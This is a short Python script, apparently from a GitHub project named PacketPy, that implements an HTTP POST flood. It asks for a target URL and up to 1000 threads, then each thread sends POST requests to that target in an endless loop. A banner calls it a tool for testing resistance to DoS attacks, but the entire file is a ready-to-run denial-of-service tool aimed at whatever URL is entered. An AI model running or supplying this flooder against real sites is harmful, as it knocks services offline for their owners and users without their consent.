# Simple HTTP-POST Flood python script
# Standalone PacketPy script
# https://github.com/fortless
# Base written by https://github.com/awaitclone

version = '1.1-01_beta' # Don't touch this

import threading
import requests
import os

def clearterminal():
    if os.name == str("nt"):
        os.system("cls")
    else:
        os.system("clear")
print("--------")
print("ATTENTION")
print("This tool was created to test devices’ abilities to withstand DoS attacks.")
print("Usage of this tool for malicious purposes without permission is prohibited.")
print("")
print("PacketPy " + str(version))
print("--------")
print("")
input("Press ENTER to continue ")
print("")
def dos(target):
    while True:
            res = requests.post(url, data={'requesting': '666666',})        
threads = 20
url = input("Target URL [https://example.com]: ")
if not url.__contains__("http") or not url.__contains__(".") or not url.__contains__("://"):
    while not url.__contains__("http") or not url.__contains__("."):
        print("Please provide a valid URL.")
        url = input("Target URL [https://example.com]: ")
try:
    threads = int(input("Threads [20] [1-1000]:  "))
except ValueError:
    threads = 20
if threads == 0:
    print("Threads must be at least 1. Setting to 1.")
    threads = 1
clearterminal()
print("-----------------------------------------")
print("")
print(" -=- HTTP payload in progress.. -=-")
print("")
print("")
print("- Target URL: " + str(url)+ " -")
print("- HTTP Payload size: Random")
print("- OS: " + str(os.name) + " -")
print("- PacketPy version: " + str(version) + " -")
print("")
print("PacketPy, an open-source")
print("network tool library, written in")
print("Python.")
print("")
print("Interactive mode (HTTP Flood)")
print("")
print("---> Press CTRL+C to stop the payload!")
print("-----------------------------------------")

for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()